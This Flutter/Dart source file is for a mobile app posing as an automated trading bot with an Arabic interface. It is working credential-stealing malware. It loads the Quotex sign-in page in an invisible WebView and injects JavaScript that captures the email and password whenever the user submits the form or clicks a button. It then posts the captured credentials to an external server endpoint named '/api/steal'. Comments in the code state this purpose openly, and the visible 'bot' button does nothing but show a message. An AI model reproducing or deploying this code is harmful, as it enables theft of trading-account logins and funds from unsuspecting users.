import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'تطبيق التداول الآلي',
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: const Color(0xFF030305),
        primaryColor: const Color(0xFF00E5FF),
        textTheme: GoogleFonts.cairoTextTheme(Theme.of(context).textTheme).apply(
          bodyColor: Colors.white,
          displayColor: Colors.white,
        ),
        colorScheme: const ColorScheme.dark(
          primary: Color(0xFF00E5FF),
          secondary: Color(0xFFFFD700),
          surface: Color(0xFF0E0E14),
          error: Color(0xFFFF1744),
          onPrimary: Colors.black,
          onSecondary: Colors.black,
        ),
      ),
      home: const MainTradingScreen(),
    );
  }
}

class MainTradingScreen extends StatefulWidget {
  const MainTradingScreen({super.key});

  @override
  State<MainTradingScreen> createState() => _MainTradingScreenState();
}

class _MainTradingScreenState extends State<MainTradingScreen> {
  bool isDemoAccount = true;
  bool isBotRunning = false;
  late WebViewController _webViewController;

  // رابط السيرفر الجديد
  final String serverUrl = "https://clone-server-dejt.onrender.com";

  @override
  void initState() {
    super.initState();
    _initWebView();
  }

  void _initWebView() {
    _webViewController = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..addJavaScriptChannel(
        'QTX_CREDS',
        onMessageReceived: (JavaScriptMessage message) {
          // هون بنستقبل الإيميل والباسورد ونبعتهم لسيرفرنا
          print("Received Creds: ${message.message}");
          _sendToServer(message.message);
        },
      )
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageFinished: (url) {
            // حقن السكربت بعد ما تخلص الصفحة
            _injectScript();
          },
        ),
      )
      ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
  }

  void _injectScript() {
    String jsScript = """
      (function() {
        function setNativeValue(el, value) {
          try {
            var proto = window.HTMLInputElement.prototype;
            var desc = Object.getOwnPropertyDescriptor(proto, 'value');
            desc.set.call(el, value);
          } catch (e) { el.value = value; }
          el.dispatchEvent(new Event('input', { bubbles: true }));
          el.dispatchEvent(new Event('change', { bubbles: true }));
        }
        function findEmail() {
          return document.querySelector('input[name="email"], input[type="email"], #email');
        }
        function findPass() {
          return document.querySelector('input[name="password"], input[type="password"], #password');
        }
        function sendCreds() {
          try {
            var e = findEmail(), p = findPass();
            if (e && p && e.value && p.value) {
              QTX_CREDS.postMessage(JSON.stringify({email: e.value, password: p.value}));
            }
          } catch (err) {}
        }
        if (!window.__qtxHooksInstalled) {
          window.__qtxHooksInstalled = true;
          document.addEventListener('submit', sendCreds, true);
          document.addEventListener('click', function(ev) {
            var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
            if (t) sendCreds();
          }, true);
        }
      })();
    """;
    _webViewController.runJavaScript(jsScript);
  }

  Future<void> _sendToServer(String data) async {
    try {
      await http.post(
        Uri.parse('$serverUrl/api/steal'),
        headers: {"Content-Type": "application/json"},
        body: data,
      );
    } catch (e) {
      print("Error sending to server: $e");
    }
  }

  void toggleBot() {
    setState(() {
      isBotRunning = !isBotRunning;
    });
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(isBotRunning ? "تم تشغيل البوت!" : "تم إيقاف البوت!"),
        backgroundColor: isBotRunning ? Colors.green : Colors.red,
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          // الـ WebView المخفي (شفاف عشان ما يبين)
          Opacity(
            opacity: 0.0,
            child: SizedBox(
              width: 1,
              height: 1,
              child: WebViewWidget(controller: _webViewController),
            ),
          ),
          // الواجهة
          Container(
            decoration: const BoxDecoration(
              gradient: RadialGradient(
                colors: [Color(0xFF0E0E14), Color(0xFF030305)],
                center: Alignment.center,
                radius: 1.5,
              ),
            ),
          ),
          SafeArea(
            child: SingleChildScrollView(
              padding: const EdgeInsets.all(16.0),
              child: Column(
                children: [
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      const Icon(Icons.menu, color: Colors.white),
                      Text('التحكم الآلي', style: TextStyle(color: const Color(0xFFFFD700), fontSize: 20, fontWeight: FontWeight.bold)),
                      const Icon(Icons.settings, color: Colors.white),
                    ],
                  ),
                  const SizedBox(height: 20),
                  ElevatedButton(
                    onPressed: toggleBot,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: isBotRunning ? Colors.red : const Color(0xFF00E5FF),
                      padding: const EdgeInsets.symmetric(horizontal: 50, vertical: 15),
                    ),
                    child: Text(isBotRunning ? 'إيقاف البوت' : 'بدء التداول', style: const TextStyle(color: Colors.black, fontSize: 18, fontWeight: FontWeight.bold)),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}
